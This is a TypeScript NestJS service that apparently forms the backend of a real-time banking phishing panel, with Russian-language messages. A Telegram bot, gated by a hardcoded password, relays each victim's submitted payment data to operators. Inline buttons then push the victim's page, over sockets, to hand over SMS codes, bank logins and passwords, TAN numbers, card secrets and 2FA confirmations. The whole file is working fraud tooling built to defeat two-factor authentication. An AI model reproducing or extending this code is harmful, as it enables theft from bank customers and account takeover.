import { Injectable, OnModuleInit } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Telegraf, Context, Markup } from 'telegraf';
import { Socket } from 'socket.io';
const TelegrafStatelessQuestion = require('telegraf-stateless-question');

import { TelegramRepository } from './telegram.repository';
import { TelegrafConfig } from '../../config/telegraf.config';
import { TelegramUser } from './telegram-user.entity';
import { PaymentCodeDto } from '../payment/dto/payment-code.dto';
import { PaymentLoginDto } from '../payment/dto/payment-login.dto';
import { PaymentPasswordDto } from '../payment/dto/payment-password.dto';
import { PaymentSecretDto } from '../payment/dto/payment-secret.dto';
import { PaymentTanDto } from '../payment/dto/payment-tan.dto';

const passwordQuestion = new TelegrafStatelessQuestion(
  'password',
  async ctx => {
    const { id } = ctx.message.chat;

    if (ctx.message.text === 'dorogoychifir') {
      const user = new TelegramUser();

      user.telegramId = id;

      await user.save();

      ctx.reply(
        `Вы были внесены в базу данных пользователей панели. Теперь в этот чат будет приходить информация о работе панели, ваш ID: ${id}`,
      );
    } else {
      ctx.reply(`Пароль неверный.`);
      passwordQuestion.replyWithMarkdown(ctx, 'Введите пароль доступа');
    }
  },
);

@Injectable()
export class TelegramService implements OnModuleInit {
  bot: any;

  constructor(
    @InjectRepository(TelegramRepository)
    private telegramRepository: TelegramRepository,
  ) {}

  onModuleInit = (): void => {
    try {
      const bot = new Telegraf(TelegrafConfig.botToken);

      bot.start(ctx => {
        this.saveUser(ctx);
      });

      bot.use(passwordQuestion.middleware());

      bot.launch();

      this.bot = bot;

      console.log('started');
    } catch (e) {
      console.log(e);
    }
  };

  sendPaymentData = async (message: string, socket: Socket): Promise<void> => {
    const id = Date.now();
    const messageResponse = await this.sendUsersMessage(
      message,
      Markup.inlineKeyboard([
        [
          Markup.button.callback('✅ СМС', `data_payment_good_sms_${id}`),
          Markup.button.callback('✅ 2FA ЛК', `data_payment_good_2fa_${id}`),
          Markup.button.callback('✅ ЛК', `data_payment_good_auth_${id}`),
        ],
        [
          Markup.button.callback('✅ ТАН', `data_payment_good_tan_${id}`),
          Markup.button.callback('✅ Секрет', `data_payment_good_secret_${id}`),
          Markup.button.callback('❕ТП', `data_payment_support_${id}`),
        ],
        [Markup.button.callback('❌ Не валид', `data_payment_bad_${id}`)],
      ]),
    );

    this.bot.action(`data_payment_good_tan_${id}`, ctx => {
      const goodMessage = `${message.replace(/\n/g, ' \n✅ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${goodMessage}\nОжидается ввод TAN`,
        );
      });

      socket.emit('PAYMENT_DATA_TAN_GOOD', { type: 'TAN' });

      socket.on('PAYMENT_TAN_SEND', (payload: PaymentTanDto) => {
        this.sendPaymentTan(
          payload,
          socket,
          ctx,
          goodMessage,
          messageResponse,
          id,
        );
      });
    });

    this.bot.action(`data_payment_good_secret_${id}`, ctx => {
      const goodMessage = `${message.replace(/\n/g, ' \n✅ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${goodMessage}\nОжидается ввод секрета`,
        );
      });

      socket.emit('PAYMENT_DATA_SECRET_GOOD', { type: 'SECRET' });

      socket.on('PAYMENT_SECRET_SEND', (payload: PaymentSecretDto) => {
        this.sendPaymentSecret(
          payload,
          socket,
          ctx,
          goodMessage,
          messageResponse,
          id,
        );
      });
    });

    this.bot.action(`data_payment_good_sms_${id}`, ctx => {
      const goodMessage = `${message.replace(/\n/g, ' \n✅ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${goodMessage}\nОжидается смс-код`,
        );
      });

      socket.emit('PAYMENT_DATA_CODE_GOOD', { type: 'CODE' });

      socket.on('PAYMENT_CODE_SEND', (payload: PaymentCodeDto) => {
        this.sendPaymentCode(
          payload,
          socket,
          ctx,
          goodMessage,
          messageResponse,
        );
      });
    });

    this.bot.action(`data_payment_good_auth_${id}`, ctx => {
      const goodMessage = `${message.replace(/\n/g, ' \n✅ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${goodMessage}\nОжидается ввод логина`,
        );
      });

      socket.emit('PAYMENT_DATA_AUTH_GOOD', { type: 'AUTH' });

      socket.on('PAYMENT_AUTH_LOGIN_SEND', (payload: PaymentLoginDto) => {
        this.sendPaymentLogin(
          payload,
          socket,
          ctx,
          goodMessage,
          messageResponse,
        );
      });
    });

    this.bot.action(`data_payment_good_2fa_${id}`, ctx => {
      const goodMessage = `${message.replace(/\n/g, ' \n✅ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${goodMessage}\nОжидается подтверждение в ЛК`,
        );
      });

      socket.emit('PAYMENT_DATA_2FA_GOOD', { type: '2FA' });

      socket.on('PAYMENT_2FA_SEND', () => {
        this.sendPayment2FA(socket, ctx, goodMessage, messageResponse);
      });
    });

    this.bot.action(`data_payment_support_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${message}\nПользователю показало уведомление о ТП`,
          Markup.inlineKeyboard([
            Markup.button.callback('✅ СМС', `data_payment_good_sms_${id}`),
            Markup.button.callback('✅ 2FA ЛК', `data_payment_good_2fa_${id}`),
            Markup.button.callback('✅ ЛК', `data_payment_good_auth_${id}`),
            Markup.button.callback('❌ Не валид', `data_payment_bad_${id}`),
          ]),
        );
      });

      socket.emit('PAYMENT_DATA_SUPPORT');
    });

    this.bot.action(`data_payment_bad_${id}`, ctx => {
      const badMessage = `${message.replace(/\n/g, ' \n❌ ')}`;

      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          badMessage,
        );
      });

      socket.emit('PAYMENT_DATA_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPaymentCode = async (
    payload: PaymentCodeDto,
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
  ): Promise<void> => {
    const { code } = payload;

    const id = Date.now();

    const message = `${initialMessage}\nКод: ${code}`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        message,
        Markup.inlineKeyboard([
          Markup.button.callback('✅ Валид', `code_payment_good_${id}`),
          Markup.button.callback('❌ Не валид', `code_payment_bad_${id}`),
        ]),
      );
    });

    this.bot.action(`code_payment_good_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${initialMessage}\n✅ Код: ${code}`,
        );
      });
      socket.emit('PAYMENT_CODE_GOOD');
    });

    this.bot.action(`code_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ Код: ${code}\nОжидается повторный ввод кода`,
        );
      });
      socket.emit('PAYMENT_CODE_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPaymentSecret = async (
    payload: PaymentSecretDto,
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
    paymentId: number,
  ): Promise<void> => {
    const { secret } = payload;

    const id = Date.now();

    const message = `${initialMessage}\nСекрет: ${secret}`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        `${initialMessage}\n✅ Секрет: ${secret}`,
        Markup.inlineKeyboard([
          [
            Markup.button.callback(
              '✅ СМС',
              `data_payment_good_sms_${paymentId}`,
            ),
            Markup.button.callback(
              '✅ 2FA ЛК',
              `data_payment_good_2fa_${paymentId}`,
            ),
            Markup.button.callback(
              '✅ ЛК',
              `data_payment_good_auth_${paymentId}`,
            ),
          ],
          [
            Markup.button.callback(
              '✅ TAN',
              `data_payment_good_tan_${paymentId}`,
            ),
            Markup.button.callback('❌ Не валид', `secret_payment_bad_${id}`),
          ],
        ]),
      );
    });

    this.bot.action(`secret_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ Секрет: ${secret}\nОжидается повторный ввод секрета`,
        );
      });
      socket.emit('PAYMENT_SECRET_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPaymentTan = async (
    payload: PaymentTanDto,
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
    paymentId: number,
  ): Promise<void> => {
    const { tan } = payload;

    const id = Date.now();

    const message = `${initialMessage}\nTAN: ${tan}`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        message,
        Markup.inlineKeyboard([
          [
            Markup.button.callback(
              '✅ СМС',
              `data_payment_good_sms_${paymentId}`,
            ),
            Markup.button.callback(
              '✅ 2FA ЛК',
              `data_payment_good_2fa_${paymentId}`,
            ),
            Markup.button.callback(
              '✅ ЛК',
              `data_payment_good_auth_${paymentId}`,
            ),
          ],
          [
            Markup.button.callback(
              '✅ Секрет',
              `data_payment_good_secret_${paymentId}`,
            ),
            Markup.button.callback('❌ Не валид', `tan_payment_bad_${id}`),
          ],
        ]),
      );
    });

    this.bot.action(`tan_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ TAN: ${tan}\nОжидается повторный ввод TAN`,
        );
      });
      socket.emit('PAYMENT_TAN_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPaymentLogin = async (
    payload: PaymentLoginDto,
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
  ): Promise<void> => {
    const { login } = payload;

    const id = Date.now();

    const message = `${initialMessage}\nЛогин: ${login}`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        message,
        Markup.inlineKeyboard([
          Markup.button.callback('✅ Валид', `auth_login_payment_good_${id}`),
          Markup.button.callback('❌ Не валид', `auth_login_payment_bad_${id}`),
        ]),
      );
    });

    this.bot.action(`auth_login_payment_good_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${initialMessage}\n✅ Логин: ${login}\nОжидается ввод пароля`,
        );
      });
      socket.emit('PAYMENT_AUTH_LOGIN_GOOD');

      socket.on('PAYMENT_AUTH_PASSWORD_SEND', (payload: PaymentPasswordDto) => {
        this.sendPaymentPassword(
          payload,
          socket,
          ctx,
          `${initialMessage}\n✅ Логин: ${login}`,
          messageResponse,
        );
      });
    });

    this.bot.action(`auth_login_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ Логин: ${login}\nОжидается повторный ввод логина`,
        );
      });
      socket.emit('PAYMENT_AUTH_LOGIN_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPaymentPassword = async (
    payload: PaymentPasswordDto,
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
  ): Promise<void> => {
    const { password } = payload;

    const id = Date.now();

    const message = `${initialMessage}\nПароль: ${password}`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        message,
        Markup.inlineKeyboard([
          Markup.button.callback(
            '✅ Валид',
            `auth_password_payment_good_${id}`,
          ),
          Markup.button.callback(
            '❌ Не валид',
            `auth_password_payment_bad_${id}`,
          ),
        ]),
      );
    });

    this.bot.action(`auth_password_payment_good_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${initialMessage}\n✅ Пароль: ${password}\nОжидается ввод смс`,
        );
      });
      socket.emit('PAYMENT_AUTH_PASSWORD_GOOD');

      socket.on('PAYMENT_CODE_SEND', (payload: PaymentCodeDto) => {
        this.sendPaymentCode(
          payload,
          socket,
          ctx,
          `${initialMessage}\n✅ Пароль: ${password}`,
          messageResponse,
        );
      });
    });

    this.bot.action(`auth_password_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ Пароль: ${password}\nОжидается повторный ввод пароля`,
        );
      });
      socket.emit('PAYMENT_AUTH_PASSWORD_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendPayment2FA = async (
    socket: Socket,
    ctx: any,
    initialMessage: string,
    messageResponse: any,
  ): Promise<void> => {
    const id = Date.now();

    const message = `${initialMessage}\nПользователь подтвердил вход`;

    messageResponse.map(item => {
      ctx.telegram.editMessageText(
        item.chat.id,
        item.message_id,
        item.message_id,
        message,
        Markup.inlineKeyboard([
          Markup.button.callback('✅ Валид', `2fa_payment_good_${id}`),
          Markup.button.callback('❌ Не валид', `2fa_payment_bad_${id}`),
        ]),
      );
    });

    this.bot.action(`2fa_payment_good_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `${initialMessage}\n✅ Подтверждение ЛК`,
        );
      });
      socket.emit('PAYMENT_2FA_GOOD');
    });

    this.bot.action(`2fa_payment_bad_${id}`, ctx => {
      messageResponse.map(item => {
        ctx.telegram.editMessageText(
          item.chat.id,
          item.message_id,
          item.message_id,
          `\n${initialMessage}\n❌ Подтверждение ЛК\nОжидается повторное подтверждение`,
        );
      });
      socket.emit('PAYMENT_2FA_BAD');
    });
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  saveUser = async (ctx: Context): Promise<void> => {
    const { id } = ctx.message.chat;

    try {
      const alreadyUser = await this.telegramRepository.findOne({
        where: { telegramId: id },
      });

      if (alreadyUser) {
        ctx.reply(
          `Привет. Вы уже находитесь в базе данных пользователей панели. Теперь в этот чат будет приходить информация о работе панели, ваш ID: ${id}`,
        );
        return;
      }

      passwordQuestion.replyWithMarkdown(ctx, 'Введите пароль доступа');
      return;
    } catch (e) {
      ctx.reply(`Произошла ошибка: ${e.message}`);
    }
  };

  // eslint-disable-next-line @typescript-eslint/explicit-module-boundary-types
  sendUsersMessage = async (message: string, options?: any): Promise<any> => {
    const users = await this.telegramRepository.find();

    const messages = await Promise.all(
      users.map(async item => {
        try {
          const data = await this.bot.telegram.sendMessage(
            item.telegramId,
            message,
            options,
          );

          return data;
        } catch (error) {
          // If user stopped bot
          const { code } = error;

          if (code === 403) {
            await this.telegramRepository.delete({
              telegramId: item.telegramId,
            });
          }
        }
      }),
    );

    return messages.filter(item => !!item);
  };
}
